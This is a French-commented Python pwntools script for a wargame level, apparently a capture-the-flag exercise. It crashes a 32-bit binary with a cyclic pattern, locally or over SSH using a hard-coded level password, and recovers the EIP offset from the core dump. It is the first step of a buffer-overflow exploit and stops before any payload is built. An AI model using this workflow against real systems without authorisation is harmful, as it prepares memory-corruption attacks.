#!/usr/bin/env python3
from pwn import *

# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = True  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8888  # Port pour SSH
USER = "level1"  # Nom d'utilisateur SSH
PASSWORD = "1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a"  # Mot de passe SSH

def print_binary_info():
    # Charger le binaire avec pwntools
    elf = ELF('./Resources/level1')
    
    print("\n=== Informations sur le binaire ===")
    print("\nFonctions disponibles:")
    for func in elf.functions:
        print(f"  - {func}: 0x{elf.functions[func].address:x}")
    
    print("\nSymboles PLT:")
    for plt in elf.plt:
        print(f"  - {plt}: 0x{elf.plt[plt]:x}")
    
    print("\nAdresses importantes:")
    print(f"  - Entry point: 0x{elf.entry:x}")
    print(f"  - Base address: 0x{elf.address:x}")
    
    return elf

def get_connection():
    if LOCAL:
        return process(['./Resources/level1'])
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        return shell.process(['/home/user/level1/level1'])

def exploit():
    # Afficher les informations du binaire en premier
    if LOCAL:
        elf = print_binary_info()
    
    # Établir la connexion
    conn = get_connection()
    
    # Créer un pattern plus long (100 octets)
    pattern = cyclic(100)
    
    # Envoyer le pattern
    conn.sendline(pattern)
    
    # Attendre que le programme crash
    conn.wait()
    
    # Si en local, on peut utiliser process pour obtenir le core dump
    if LOCAL:
        core = conn.corefile
        # Obtenir la valeur de EIP
        eip_value = core.eip
        print(f"\nValeur de EIP: 0x{eip_value:08x}")
        # Trouver l'offset dans le pattern
        eip_offset = cyclic_find(eip_value)
        print(f"Offset de EIP: {eip_offset} bytes")

if __name__ == "__main__":
    exploit() 